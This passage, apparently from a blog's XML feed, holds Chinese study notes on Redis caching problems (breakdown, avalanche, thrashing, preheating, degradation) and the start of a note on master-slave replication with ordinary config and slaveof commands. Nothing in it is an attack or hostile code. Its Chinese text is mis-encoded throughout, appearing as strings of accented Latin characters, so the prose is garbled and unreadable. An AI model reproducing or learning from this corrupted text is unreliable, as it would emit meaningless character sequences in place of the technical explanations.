çƒ­ç‚¹æ•°æ®keyçš„è¿‡æœŸæ—¶é—´</p><p><strong>äºŒã€å®æ—¶è°ƒæ•´</strong></p><p>ç°åœºç›‘æ§å“ªäº›æ•°æ®è¢«é¢‘ç¹è®¿é—®ï¼Œå®æ—¶è°ƒæ•´keyçš„è¿‡æœŸæ—¶é—´</p><p><strong>ä¸‰ã€æ°¸ä¸è¿‡æœŸ</strong></p><p>ä¸ç»™çƒ­ç‚¹æ•°æ®è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œè‹¥æ•°æ®éœ€è¦æ›´æ–°çš„è¯ï¼Œå¯ä»¥åœ¨åå°å¼€å¯ä¸€ä¸ªå¼‚æ­¥çº¿ç¨‹ï¼Œå‘ç°è¿‡æœŸçš„ key ç›´æ¥é‡å†™ç¼“å­˜å³å¯</p><p><strong>å››ã€åˆ†å¸ƒå¼äº’æ–¥é”</strong></p><p>å½“ä¸šåŠ¡çº¿ç¨‹åœ¨å¤„ç†ç”¨æˆ·è¯·æ±‚æ—¶ï¼Œ<strong>å¦‚æœå‘ç°è®¿é—®çš„æ•°æ®ä¸åœ¨ Redis é‡Œï¼Œå°±åŠ ä¸ªäº’æ–¥é”ï¼Œä¿è¯åŒä¸€æ—¶é—´å†…åªæœ‰ä¸€ä¸ªè¯·æ±‚æ¥æ„å»ºç¼“å­˜</strong>ï¼ˆ<u>ä»æ•°æ®åº“è¯»å–æ•°æ®ï¼Œå†å°†æ•°æ®æ›´æ–°åˆ° Redis é‡Œ</u>ï¼‰ï¼Œå½“ç¼“å­˜æ„å»ºå®Œæˆåï¼Œå†é‡Šæ”¾é”ã€‚æœªèƒ½è·å–äº’æ–¥é”çš„è¯·æ±‚ï¼Œè¦ä¹ˆç­‰å¾…é”é‡Šæ”¾åé‡æ–°è¯»å–ç¼“å­˜ï¼Œè¦ä¹ˆå°±è¿”å›ç©ºå€¼æˆ–è€…é»˜è®¤å€¼ã€‚</p><p>å®ç°äº’æ–¥é”çš„æ—¶å€™ï¼Œæœ€å¥½<code>è®¾ç½®è¶…æ—¶æ—¶é—´</code>ï¼Œä¸ç„¶ç¬¬ä¸€ä¸ªè¯·æ±‚æ‹¿åˆ°äº†é”ï¼Œç„¶åè¿™ä¸ªè¯·æ±‚å‘ç”Ÿäº†æŸç§æ„å¤–è€Œä¸€ç›´é˜»å¡ï¼Œä¸€ç›´ä¸é‡Šæ”¾é”ï¼Œè¿™æ—¶å…¶ä»–è¯·æ±‚ä¹Ÿä¸€ç›´æ‹¿ä¸åˆ°é”ï¼Œæ•´ä¸ªç³»ç»Ÿå°±ä¼šå‡ºç°<code>æ— å“åº”</code>ç°è±¡ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setex &lt;key&gt; &lt;second&gt; &lt;value&gt;//ä¸Šé”å¹¶è®¾ç½®è¿‡æœŸæ—¶é—´</span><br><span class="line">set &lt;key&gt; &lt;value&gt; nx ex 10//nx: ä¸Šé”, ex: è¿‡æœŸæ—¶é—´, 10: è¿‡æœŸæ—¶é—´ä¸º10ç§’</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210814/äº’æ–¥é”.75h7xq3fu9c0.png" alt="äº’æ–¥é”" style="zoom:67%;" /><p>ä¼˜ç‚¹ï¼šè¾ƒå¥½åœ°é™ä½åç«¯å­˜å‚¨è´Ÿè½½ï¼Œå¹¶åœ¨ä¸€è‡´æ€§ä¸Šåšå¾—æ¯”è¾ƒå¥½ã€‚</p><p>ç¼ºç‚¹ï¼šå½“ç¼“å­˜å¤±æ•ˆçš„æ—¶å€™ï¼ŒåŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªçº¿ç¨‹è¯»æ•°æ®åº“ç„¶åå›å†™ç¼“å­˜ï¼Œå…¶ä»–çº¿ç¨‹éƒ½å¤„äºé˜»å¡çŠ¶æ€ã€‚å¦‚æœæ˜¯é«˜å¹¶å‘åœºæ™¯ï¼Œå¤§é‡çº¿ç¨‹é˜»å¡ä¼šé™ä½ååé‡ã€‚</p><div class="note info no-icon flat"><p>å…³äºç©¿é€ä¸å‡»ç©¿çš„ä¸€äº›å°çŸ¥è¯†<br>å­¦å®Œä¸Šé¢çš„<code>ç¼“å­˜ç©¿é€</code>ä¸<code>ç¼“å­˜å‡»ç©¿</code>ï¼Œæœ‰äº›äººå¯èƒ½æ—¶é—´ä¹…äº†å®¹æ˜“å¿˜è®°ï¼ˆè®°å¿†åŠ›å¥½çš„å¯ä»¥å¿½ç•¥ï¼‰ï¼Œå†µä¸”ä¸¤ä¸ªè¯å­—é¢ä¸Šçœ‹ä¹Ÿæœ‰ç‚¹ç›¸è¿‘ï¼ˆå°å£°bbï¼‰ï¼Œäºæ˜¯å°±å»æŸ¥äº†ä¸€äº›èµ„æ–™ã€‚<br> <code>ç©¿é€</code>ï¼Œæœ¬ä¹‰å¯æŒ‡ï¼šè´¯ç©¿ï¼Œç»è¿‡ï¼Œé€šè¿‡ï¼›<br><code>å‡»ç©¿</code>ï¼Œç¬¬ä¸€è”æƒ³æ˜¯å‡»ç©¿ç”µå‹ï¼Œç”µå‡»ç©¿ç­‰ç­‰ï¼Œå…¶å®å¤§å¤šä¹Ÿæ˜¯æŒ‡åœ¨<code>é«˜å‹åŠ›ä¸‹</code>çš„ç ´åå’Œç©¿å­”ç°è±¡ã€‚<br>å•çœ‹ä¸¤è¯ï¼Œæ„æ€ç›¸è¿‘ï¼Œä½†ä¸»è¦åŒºåˆ«åœ¨äºæ‰€å—çš„<code>ç¯å¢ƒå‹åŠ›</code>ã€‚</p></div><h2 id="ç¼“å­˜é›ªå´©">ç¼“å­˜é›ªå´©</h2><h3 id="æ¦‚å¿µ-3">æ¦‚å¿µ</h3><p>ä¸ç¼“å­˜å‡»ç©¿ç›¸ä¼¼ï¼Œä½†åŒºåˆ«åœ¨äº<code>ç¼“å­˜é›ªå´©</code>é’ˆå¯¹<code>å¤§é‡keyç¼“å­˜</code>ï¼Œè€Œ<code>ç¼“å­˜å‡»ç©¿åˆ™</code>åˆ™æ˜¯é’ˆå¯¹<code>æŸä¸ªkey</code>ã€‚</p><p>ç”±äº<code>ç¼“å­˜å±‚</code>æ‰¿è½½ç€å¤§é‡è¯·æ±‚ï¼Œæœ‰æ•ˆåœ°<code>ä¿æŠ¤</code>äº†å­˜å‚¨å±‚ï¼Œä½†æ˜¯å¦‚æœ<code>ç¼“å­˜å±‚</code>ç”±äºæŸäº›åŸå› ä¸å¯ç”¨ï¼ˆå®•æœºï¼‰æˆ–è€…<code>å¤§é‡ç¼“å­˜</code>ç”±äº<code>è¿‡æœŸæ—¶é—´ç›¸åŒ</code>åœ¨åŒä¸€æ—¶é—´æ®µå¤±æ•ˆï¼ˆå¤§æ‰¹keyå¤±æ•ˆ/çƒ­ç‚¹æ•°æ®å¤±æ•ˆï¼‰ï¼Œ<code>å¤§é‡è¯·æ±‚</code>ç›´æ¥åˆ°è¾¾å­˜å‚¨å±‚ï¼Œå­˜å‚¨å±‚å‹åŠ›è¿‡å¤§å¯¼è‡´ç³»ç»Ÿé›ªå´©ã€‚</p><p>åŒä¸€æ—¶é—´å¤§é¢ç§¯å¤±æ•ˆï¼Œé‚£ä¸€ç¬é—´Redisè·Ÿæ²¡æœ‰ä¸€æ ·ï¼Œé‚£è¿™ä¸ªæ•°é‡çº§åˆ«çš„è¯·æ±‚ç›´æ¥æ‰“åˆ°æ•°æ®åº“å‡ ä¹æ˜¯<code>ç¾éš¾æ€§</code>çš„ã€‚</p><h3 id="é€ æˆåŸå› -2">é€ æˆåŸå› </h3><ol><li>å¤§é‡æ•°æ®åŒæ—¶è¿‡æœŸ</li><li>Redisæ•…éšœå®•æœº</li></ol><h3 id="è§£å†³æ–¹æ¡ˆ-3">è§£å†³æ–¹æ¡ˆ</h3><h4 id="é’ˆå¯¹å¤§é‡æ•°æ®åŒæ—¶è¿‡æœŸ">é’ˆå¯¹å¤§é‡æ•°æ®åŒæ—¶è¿‡æœŸ</h4><p><strong>ä¸€ã€å‡åŒ€è®¾ç½®è¿‡æœŸæ—¶é—´</strong></p><p>é¢„é˜²å¤§é¢ç§¯çš„ key åŒæ—¶å¤±æ•ˆï¼Œå¯ä»¥ç»™ä¸åŒçš„ key è¿‡æœŸæ—¶é—´åŠ ä¸Šéšæœºå€¼ï¼Œè®©ç¼“å­˜å¤±æ•ˆçš„æ—¶é—´ç‚¹å°½é‡å‡åŒ€ï¼Œè¿™æ ·å¯ä»¥ä¿è¯æ•°æ®ä¸ä¼šåœ¨åŒä¸€æ—¶é—´å¤§é¢ç§¯å¤±æ•ˆã€‚</p><p><strong>äºŒã€åˆ†å¸ƒå¼äº’æ–¥é”</strong></p><p>ä¿è¯åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªä¸šåŠ¡çº¿ç¨‹æ›´æ–°ç¼“å­˜ï¼Œæœªèƒ½è·å–äº’æ–¥é”çš„è¯·æ±‚ï¼Œè¦ä¹ˆç­‰å¾…é”é‡Šæ”¾åé‡æ–°è¯»å–ç¼“å­˜ï¼Œè¦ä¹ˆå°±è¿”å›ç©ºå€¼æˆ–è€…é»˜è®¤å€¼ã€‚ä¸<code>ç¼“å­˜å‡»ç©¿</code>çš„æªæ–½ç›¸ä¼¼ã€‚</p><p><strong>ä¸‰ã€åŒkeyç­–ç•¥</strong></p><p>å¯¹ç¼“å­˜æ•°æ®å¯ä»¥ä½¿ç”¨ä¸¤ä¸ª keyï¼Œä¸€ä¸ªæ˜¯<code>ä¸» keyï¼Œä¼šè®¾ç½®è¿‡æœŸæ—¶é—´</code>ï¼Œä¸€ä¸ªæ˜¯<code>å¤‡ keyï¼Œä¸ä¼šè®¾ç½®è¿‡æœŸ</code>ï¼Œå®ƒä»¬åªæ˜¯ key ä¸ä¸€æ ·ï¼Œä½†æ˜¯ value å€¼æ˜¯ä¸€æ ·çš„ï¼Œç›¸å½“äºç»™ç¼“å­˜æ•°æ®åšäº†ä¸ªå‰¯æœ¬ã€‚</p><p>å½“ä¸šåŠ¡çº¿ç¨‹è®¿é—®ä¸åˆ°<code>ä¸» key </code>çš„ç¼“å­˜æ•°æ®æ—¶ï¼Œå°±ç›´æ¥è¿”å›<code>å¤‡ key </code>çš„ç¼“å­˜æ•°æ®ï¼Œç„¶ååœ¨æ›´æ–°ç¼“å­˜çš„æ—¶å€™ï¼ŒåŒæ—¶<code>æ›´æ–° ä¸» key å’Œ å¤‡ key çš„æ•°æ®</code>ã€‚</p><p><strong>å››ã€åå°æ›´æ–°ç¼“å­˜</strong></p><p>ä¸šåŠ¡çº¿ç¨‹ä¸å†è´Ÿè´£æ›´æ–°ç¼“å­˜ï¼Œç¼“å­˜ä¹Ÿä¸è®¾ç½®æœ‰æ•ˆæœŸï¼Œè€Œæ˜¯<code>è®©ç¼“å­˜â€œæ°¸ä¹…æœ‰æ•ˆâ€</code>ï¼Œå¹¶å°†æ›´æ–°ç¼“å­˜çš„å·¥ä½œ<code>äº¤ç”±åå°çº¿ç¨‹å®šæ—¶æ›´æ–°</code>ã€‚</p><p>äº‹å®ä¸Šï¼Œç¼“å­˜æ•°æ®ä¸è®¾ç½®æœ‰æ•ˆæœŸï¼Œå¹¶ä¸æ˜¯æ„å‘³ç€æ•°æ®ä¸€ç›´èƒ½åœ¨å†…å­˜é‡Œï¼Œå› ä¸º<code>å½“ç³»ç»Ÿå†…å­˜ç´§å¼ çš„æ—¶å€™ï¼Œæœ‰äº›ç¼“å­˜æ•°æ®ä¼šè¢«â€œæ·˜æ±°â€</code>ï¼Œè€Œåœ¨ç¼“å­˜è¢«â€œæ·˜æ±°â€åˆ°ä¸‹ä¸€æ¬¡åå°å®šæ—¶æ›´æ–°ç¼“å­˜çš„è¿™æ®µæ—¶é—´å†…ï¼Œä¸šåŠ¡çº¿ç¨‹è¯»å–ç¼“å­˜å¤±è´¥å°±è¿”å›ç©ºå€¼ï¼Œä¸šåŠ¡çš„è§†è§’å°±ä»¥ä¸ºæ˜¯æ•°æ®ä¸¢å¤±äº†ã€‚</p><p>å¦‚ä½•è§£å†³ä¸Šé¢çš„é—®é¢˜å‘¢ï¼Ÿ</p><ol><li><p><code>åå°çº¿ç¨‹</code>ä¸ä»…è´Ÿè´£å®šæ—¶æ›´æ–°ç¼“å­˜ï¼Œè€Œä¸”ä¹Ÿè´Ÿè´£<code>é¢‘ç¹åœ°æ£€æµ‹ç¼“å­˜æ˜¯å¦æœ‰æ•ˆ</code>ï¼Œæ£€æµ‹åˆ°ç¼“å­˜å¤±æ•ˆäº†ï¼Œå¯èƒ½åŸå› æ˜¯ç³»ç»Ÿç´§å¼ è€Œè¢«æ·˜æ±°çš„ï¼Œäºæ˜¯å°±è¦é©¬ä¸Š<code>ä»æ•°æ®åº“è¯»å–æ•°æ®ï¼Œå¹¶æ›´æ–°åˆ°ç¼“å­˜</code>ã€‚</p><p>è¿™ç§æ–¹å¼çš„æ£€æµ‹æ—¶é—´é—´éš”ä¸èƒ½å¤ªé•¿ï¼Œå¤ªé•¿ä¹Ÿå¯¼è‡´ç”¨æˆ·è·å–çš„æ•°æ®æ˜¯ä¸€ä¸ªç©ºå€¼è€Œä¸æ˜¯çœŸæ­£çš„æ•°æ®ï¼Œæ‰€ä»¥æ£€æµ‹çš„é—´éš”æœ€å¥½æ˜¯<code>æ¯«ç§’çº§</code>çš„ï¼Œä½†æ˜¯æ€»å½’æ˜¯æœ‰ä¸ªé—´éš”æ—¶é—´ï¼Œç”¨æˆ·ä½“éªŒä¸€èˆ¬ã€‚</p></li><li><p>åœ¨ä¸šåŠ¡çº¿ç¨‹å‘ç°ç¼“å­˜æ•°æ®å¤±æ•ˆåï¼ˆç¼“å­˜æ•°æ®è¢«æ·˜æ±°ï¼‰ï¼Œ<code>é€šè¿‡æ¶ˆæ¯é˜Ÿåˆ—å‘é€ä¸€æ¡æ¶ˆæ¯é€šçŸ¥åå°çº¿ç¨‹æ›´æ–°ç¼“å­˜</code>ï¼Œåå°çº¿ç¨‹æ”¶åˆ°æ¶ˆæ¯åï¼Œåœ¨æ›´æ–°ç¼“å­˜å‰å¯ä»¥åˆ¤æ–­ç¼“å­˜æ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨å°±ä¸æ‰§è¡Œæ›´æ–°ç¼“å­˜æ“ä½œï¼›ä¸å­˜åœ¨å°±è¯»å–æ•°æ®åº“æ•°æ®ï¼Œå¹¶å°†æ•°æ®åŠ è½½åˆ°ç¼“å­˜ã€‚</p><p>è¿™ç§æ–¹å¼ç›¸æ¯”ç¬¬ä¸€ç§æ–¹å¼ç¼“å­˜çš„æ›´æ–°ä¼šæ›´åŠæ—¶ï¼Œç”¨æˆ·ä½“éªŒä¹Ÿæ¯”è¾ƒå¥½ã€‚</p></li></ol><h4 id="é’ˆå¯¹Redisæ•…éšœå®•æœº">é’ˆå¯¹Redisæ•…éšœå®•æœº</h4><p><strong>ä¸€ã€æœåŠ¡ç†”æ–­æˆ–è¯·æ±‚é™æµæœºåˆ¶</strong></p><p>å½“Redisæ•…éšœå®•æœºè€Œå¯¼è‡´ç¼“å­˜é›ªå´©é—®é¢˜æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å¯åŠ¨<code>æœåŠ¡ç†”æ–­</code>æœºåˆ¶ï¼Œ<code>æš‚åœä¸šåŠ¡åº”ç”¨å¯¹ç¼“å­˜æœåŠ¡çš„è®¿é—®ï¼Œç›´æ¥è¿”å›é”™è¯¯</code>ï¼Œä¸ç”¨å†ç»§ç»­è®¿é—®æ•°æ®åº“ï¼Œä»è€Œé™ä½å¯¹æ•°æ®åº“çš„è®¿é—®å‹åŠ›ï¼Œä¿è¯æ•°æ®åº“ç³»ç»Ÿçš„æ­£å¸¸è¿è¡Œï¼Œç„¶åç­‰åˆ° <code>Redis æ¢å¤æ­£å¸¸</code>åï¼Œå†å…è®¸ä¸šåŠ¡åº”ç”¨è®¿é—®ç¼“å­˜æœåŠ¡ã€‚</p><p><code>æœåŠ¡ç†”æ–­æœºåˆ¶</code>æ˜¯ä¿æŠ¤æ•°æ®åº“çš„æ­£å¸¸å…è®¸ï¼Œä½†æ˜¯æš‚åœäº†ä¸šåŠ¡åº”ç”¨è®¿é—®ç¼“å­˜æœåŠ¡ç³»ç»Ÿï¼Œå…¨éƒ¨ä¸šåŠ¡éƒ½<code>æ— æ³•æ­£å¸¸å·¥ä½œ</code>ã€‚</p><p>ä¸ºäº†å‡å°‘å¯¹ä¸šåŠ¡çš„å½±å“ï¼Œæˆ‘ä»¬å¯ä»¥å¯ç”¨<code>è¯·æ±‚é™æµ</code>æœºåˆ¶ï¼Œåªå°†<code>å°‘éƒ¨åˆ†è¯·æ±‚</code>å‘é€åˆ°æ•°æ®åº“è¿›è¡Œå¤„ç†ï¼Œå†å¤šçš„è¯·æ±‚å°±åœ¨å…¥å£ç›´æ¥æ‹’ç»æœåŠ¡ï¼Œç­‰åˆ° Redis æ¢å¤æ­£å¸¸å¹¶æŠŠç¼“å­˜é¢„çƒ­å®Œåï¼Œå†è§£é™¤è¯·æ±‚é™æµçš„æœºåˆ¶ã€‚</p><p><strong>äºŒã€æ„å»ºRedisç¼“å­˜é«˜å¯é é›†ç¾¤</strong></p><p>æœåŠ¡ç†”æ–­æˆ–è¯·æ±‚é™æµæœºåˆ¶æ˜¯<code>ç¼“å­˜é›ªå´©å‘ç”Ÿå</code>çš„åº”å¯¹æ–¹æ¡ˆï¼Œæˆ‘ä»¬æœ€å¥½é€šè¿‡<code>ä¸»ä»èŠ‚ç‚¹çš„æ–¹å¼æ„å»º Redis ç¼“å­˜é«˜å¯é é›†ç¾¤</code>ã€‚</p><p>å¦‚æœ Redis ç¼“å­˜çš„ä¸»èŠ‚ç‚¹æ•…éšœå®•æœºï¼Œä»èŠ‚ç‚¹å¯ä»¥åˆ‡æ¢æˆä¸ºä¸»èŠ‚ç‚¹ï¼Œç»§ç»­æä¾›ç¼“å­˜æœåŠ¡ï¼Œé¿å…äº†ç”±äº Redis æ•…éšœå®•æœºè€Œå¯¼è‡´çš„ç¼“å­˜é›ªå´©é—®é¢˜ã€‚</p><h2 id="ç¼“å­˜é¢ ç°¸">ç¼“å­˜é¢ ç°¸</h2><p><code>ç¼“å­˜é¢ ç°¸</code>ï¼Œä¹Ÿè¢«ç§°ä¸ºâ€œç¼“å­˜æŠ–åŠ¨â€ï¼Œå¯ä»¥çœ‹ä½œä¸€ç§æ¯”â€œé›ªå´©â€æ›´è½»å¾®çš„æ•…éšœï¼Œä½†æ˜¯ä¹Ÿä¼šåœ¨ä¸€æ®µæ—¶é—´å†…å¯¹ç³»ç»Ÿé€ æˆå†²å‡»å’Œæ€§èƒ½å½±å“ï¼Œä¸€èˆ¬æ˜¯ç”±<code>ç¼“å­˜èŠ‚ç‚¹æ•…éšœ</code>å¯¼è‡´çš„ã€‚</p><p>ä¸šå†…æ¨èçš„åšæ³•æ˜¯é€šè¿‡ä¸€è‡´æ€§Hashç®—æ³•æ¥è§£å†³é—®é¢˜ã€‚</p><h2 id="ç¼“å­˜é¢„çƒ­">ç¼“å­˜é¢„çƒ­</h2><p>å³ç³»ç»Ÿä¸Šçº¿åï¼Œå…ˆå°†<code>ç›¸å…³çš„æ•°æ®æ„å»ºåˆ°ç¼“å­˜ä¸­</code>ï¼Œè¿™æ ·å°±å¯ä»¥é¿å…ç”¨æˆ·è¯·æ±‚çš„æ—¶å€™ç›´æ¥æŸ¥åº“ã€‚</p><p>è¿™éƒ¨åˆ†é¢„çƒ­çš„æ•°æ®ä¸»è¦å–å†³äº<code>è®¿é—®é‡</code>å’Œ<code>æ•°æ®é‡å¤§å°</code>ã€‚å¦‚æœæ•°æ®çš„è®¿é—®é‡ä¸å¤§çš„è¯ï¼Œé‚£ä¹ˆå°±æ²¡å¿…è¦åšé¢„çƒ­ï¼Œéƒ½æ²¡ä»€ä¹ˆå¤šå°‘è¯·æ±‚äº†ï¼Œç›´æ¥æŒ‰æ­£å¸¸çš„ç¼“å­˜è¯»å–æµç¨‹æ‰§è¡Œå°±å¥½ã€‚</p><p>è®¿é—®é‡å¤§çš„è¯ï¼Œä¹Ÿè¦çœ‹æ•°æ®çš„å¤§å°æ¥åšé¢„çƒ­æªæ–½ã€‚</p><ol><li>æ•°æ®é‡ä¸å¤§çš„æ—¶å€™ï¼Œç³»ç»Ÿå¯åŠ¨çš„æ—¶å€™<code>è¿›è¡ŒåŠ è½½ç¼“å­˜</code>åŠ¨ä½œï¼Œè¿™ç§æ•°æ®ä¸€èˆ¬å¯ä»¥æ˜¯ç”µå•†é¦–é¡µçš„è¿è¥ä½ä¹‹ç±»çš„ä¿¡æ¯ï¼›</li><li>æ•°æ®é‡å¤§çš„æ—¶å€™ï¼Œè®¾ç½®ä¸€ä¸ª<code>å®šæ—¶ä»»åŠ¡è„šæœ¬</code>ï¼Œè¿›è¡Œ<code>ç¼“å­˜çš„åˆ·æ–°</code>ï¼›</li><li>æ•°æ®é‡å¤ªå¤§çš„æ—¶å€™ï¼Œä¼˜å…ˆä¿è¯çƒ­ç‚¹æ•°æ®è¿›è¡Œ<code>æå‰åŠ è½½åˆ°ç¼“å­˜</code>ï¼Œå¹¶ä¸”ç¡®ä¿è®¿é—®æœŸé—´ä¸èƒ½æ›´æ”¹ç¼“å­˜ï¼Œæ¯”å¦‚ç”¨å®šæ—¶å™¨åœ¨ç§’æ€æ´»åŠ¨å‰30åˆ†é’Ÿå°±æŠŠå•†å“ä¿¡æ¯ä¹‹ç±»çš„åˆ·æ–°åˆ°ç¼“å­˜ï¼ŒåŒæ—¶è§„å®šåå°è¿è¥äººå‘˜ä¸èƒ½åœ¨ç§’æ€æœŸé—´æ›´æ”¹å•†å“å±æ€§ã€‚</li></ol><h2 id="ç¼“å­˜é™çº§">ç¼“å­˜é™çº§</h2><p>å³<code>ç¼“å­˜å¤±æ•ˆ</code>æˆ–<code>ç¼“å­˜æœåŠ¡å™¨æŒ‚æ‰</code>çš„æƒ…å†µä¸‹ï¼Œ<code>ä¸å»è®¿é—®æ•°æ®åº“</code>ï¼Œç›´æ¥è¿”å›é»˜è®¤æ•°æ®æˆ–è®¿é—®æœåŠ¡çš„å†…å­˜æ•°æ®ã€‚</p><p>åœ¨é¡¹ç›®å®æˆ˜ä¸­é€šå¸¸ä¼šå°†éƒ¨åˆ†çƒ­ç‚¹æ•°æ®ç¼“å­˜åˆ°æœåŠ¡çš„å†…å­˜ä¸­ï¼Œç±»ä¼¼ <code>HashMap</code>ã€<code>Guava</code> è¿™æ ·çš„å·¥å…·ï¼Œä¸€æ—¦ç¼“å­˜å‡ºç°å¼‚å¸¸ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨æœåŠ¡çš„å†…å­˜æ•°æ®ï¼Œä»è€Œé¿å…æ•°æ®åº“é­å—å·¨å¤§å‹åŠ›ã€‚</p><p>å½“ç„¶ï¼Œè¿™æ ·çš„æ“ä½œå¯¹äºä¸šåŠ¡æ˜¯<code>æœ‰æŸå®³</code>çš„ï¼Œ<code>åˆ†å¸ƒå¼ç³»ç»Ÿ</code>ä¸­å¾ˆå®¹æ˜“å‡ºç°<code>æ•°æ®ä¸ä¸€è‡´é—®é¢˜</code>ã€‚</p><p>æ‰€ä»¥ï¼Œä¸€èˆ¬è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éƒ½ä¼˜å…ˆä¿è¯ä»<code>è¿ç»´è§’åº¦</code>ç¡®ä¿ç¼“å­˜æœåŠ¡å™¨çš„<code>é«˜å¯ç”¨æ€§</code>ã€‚æ¯”å¦‚ Redis çš„éƒ¨ç½²é‡‡ç”¨é›†ç¾¤æ–¹å¼ï¼ŒåŒæ—¶åšå¥½å¤‡ä»½ã€‚æ€»ä¹‹ï¼Œå°½é‡é¿å…å‡ºç°é™çº§çš„å½±å“ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ•°æ®åº“ </category>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> æ•°æ®åº“ </tag>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rediså­¦ä¹ ç¬”è®°ï¼ˆ2ï¼‰</title>
      <link href="/posts/1bb24f34/"/>
      <url>/posts/1bb24f34/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note orange icon flat"><i class="note-icon fas fa-bullhorn"></i><p>å‰æ–¹å¤šå›¾æé†’ï¼Œè¯·è€å¿ƒç­‰å¾…åŠ è½½æˆ–åˆ·æ–°é¡µé¢ï¼Œå·²å‚è€ƒå¤šç§èµ„æ–™ï¼Œä½œå›¾ä¸æ˜“ï¼Œä¸”çœ‹ä¸”çæƒœã€‚ï¼ˆå¿«ç´¯è¶´äº†ï¼‰</p></div><h1>Redisä¸»ä»å¤åˆ¶</h1><h2 id="æ¦‚è¿°">æ¦‚è¿°</h2><p><code>ä¸»ä»å¤åˆ¶</code>ï¼Œä¸»æœºæ•°æ®æ›´æ–°åæ ¹æ®é…ç½®å’Œç­–ç•¥ï¼Œè‡ªåŠ¨åŒæ­¥é“å¤‡æœºçš„<code>master/slaveræœºåˆ¶</code>ï¼Œ<code>Masterä»¥å†™ä¸ºä¸»</code>ï¼Œ<code>Slaveä»¥è¯»ä¸ºä¸»</code>ã€‚</p><p>å…¶ä½œç”¨æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li>è¯»å†™åˆ†ç¦»ï¼šä¸»æœåŠ¡å™¨è´Ÿè´£å†™ï¼Œå„ä»æœåŠ¡å™¨è´Ÿè´£è¯»ï¼Œå³ä¸»æœºå†™ï¼Œä»æœºè¯»</li><li>å®¹ç¾å¿«é€Ÿæ¢å¤ï¼šä¸»ä»å¤šå°æœåŠ¡å™¨è¿›è¡ŒæŒä¹…åŒ–æ“ä½œï¼Œä»»æ„ä¸€å°æœåŠ¡å™¨å®•æœºä¹Ÿä¸ä¼šå½±å“æ•°æ®æ¢å¤ï¼Œæœ‰æ•ˆé¿å…äº†å•ç‚¹æ•…éšœé—®é¢˜ï¼Œä½¿æ•°æ®æŒä¹…åŒ–æ›´åŠ å®‰å…¨</li><li>å…¶ä»–ï¼šä¸»ä»å¤åˆ¶æ˜¯å®ç°å“¨å…µæ¨¡å¼å’ŒRedisé›†ç¾¤çš„å‰æ</li></ul><h2 id="å®ç°ä¸»ä»å¤åˆ¶">å®ç°ä¸»ä»å¤åˆ¶</h2><p>æ¯ä¸€å°<code>Redis</code>æœåŠ¡å™¨å¯åŠ¨æ—¶ï¼Œé»˜è®¤éƒ½ä¸ºä¸»æœåŠ¡å™¨ï¼ˆmasterï¼‰,å¯é€šè¿‡å‘½ä»¤<code>info replcation</code>æŸ¥çœ‹</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/1.5foiw2sgbgo0.jpg" alt="1"></p><ol><li><p>é…ç½®æ–‡ä»¶ä¿®æ”¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /myredis                # åˆ›å»ºæ–‡ä»¶å¤¹å­˜å‚¨é…ç½®æ–‡ä»¶</span><br><span class="line">cd /myredis# è¿›å…¥æ–‡ä»¶å¤¹</span><br><span class="line">cp /etc/redis.conf /myredis/redis.conf# å¤åˆ¶åŸé…ç½®æ–‡ä»¶ï¼Œä»¥ä¾¿æ“ä½œ</span><br></pre></td></tr></table></figure><p>åˆ›å»º<code>reids6379.conf</code>ã€<code>reids6380.conf</code>ã€<code>reids6381.conf</code>æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶ä¸­å¡«å…¥ä»¥ä¸‹ä¿¡æ¯</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include /myredis/redis.<span class="keyword">conf</span></span><br><span class="line">pidfile /var/run/redis_ç«¯å£å·.pid</span><br><span class="line">port ï¼ˆç«¯å£å·ï¼‰</span><br><span class="line">dbfilename dumpï¼ˆç«¯å£å·ï¼‰.rdb</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/2.6wgs4wui72w0.jpg" alt="2"></p></li><li><p>å¯åŠ¨redisæœåŠ¡å™¨</p><p>æ–°å»ºçª—å£é€šè¿‡<code>redis-cli -p ç«¯å£å·</code>è¿›å…¥å„è‡ªçš„å®¢æˆ·ç«¯</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/3.36sncsb6o840.jpg" alt="3"></p></li><li><p>ä½¿ç”¨å‘½ä»¤å®ç°ä¸»ä»å…³ç³»ï¼ˆé…ä»ä¸é…ä¸»ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slaveof &lt;masterip&gt; &lt;masterport&gt;</span><br></pre></td></tr></table></figure><p>è¯¦æƒ…å¦‚ä¸‹å›¾æ‰€ç¤º</p><p>ä»èŠ‚ç‚¹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E4%BB%8E%E8%8A%82%E7%82%B9.31rkn6xum640.jpg" 